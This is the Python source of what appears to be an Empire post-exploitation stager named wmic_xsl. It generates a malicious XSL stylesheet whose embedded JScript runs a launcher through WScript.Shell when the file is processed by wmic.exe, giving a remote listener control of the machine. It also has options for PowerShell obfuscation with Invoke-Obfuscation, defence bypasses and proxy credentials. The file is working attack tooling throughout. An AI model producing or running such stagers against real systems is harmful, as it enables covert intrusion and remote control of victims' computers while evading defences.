from empire.server.core.exceptions import StagerGenerationException


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "wmic_xsl",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@subTee",
                    "Link": "",
                },
                {
                    "Name": "Matt Graeber",
                    "Handle": "@mattifestation",
                    "Link": "https://twitter.com/mattifestation",
                },
            ],
            "Description": "Generates an XSL stylesheets file to be run with wmic.exe. Example: wmic process list /FORMAT:evil.xsl",
            "Comments": [],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "launcher.xsl",
            },
            "Base64": {
                "Description": "Base64 encode the output.",
                "Required": True,
                "Value": True,
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                "Required": False,
                "Value": False,
                "DependsOn": [{"name": "Language", "values": ["powershell"]}],
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use.",
                "Required": False,
                "Value": r"Token\All\1,Launcher\STDIN++\12467",
                "DependsOn": [
                    {"name": "Language", "values": ["powershell"]},
                    {"name": "Obfuscate", "values": ["True"]},
                ],
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
                "BypassLanguage": "powershell",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        base64 = self.options["Base64"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        encode = base64
        obfuscate_script = obfuscate

        if language in ["csharp", "ironpython"]:
            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner_routed(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
                bypasses=self.options["Bypasses"]["Value"],
            )
        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=self.options["Bypasses"]["Value"],
            )

        if not launcher:
            raise StagerGenerationException("Error in launcher command generation.")

        code = '<?xml version="1.0"?><stylesheet\n'
        code += 'xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"\n'
        code += 'xmlns:user="placeholder"\n'
        code += 'version="1.0">\n'
        code += '<output method="text"/><ms:script implements-prefix="user" language="JScript">'
        code += '<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("'
        code += launcher
        code += '");]]></ms:script></stylesheet>'
        return code
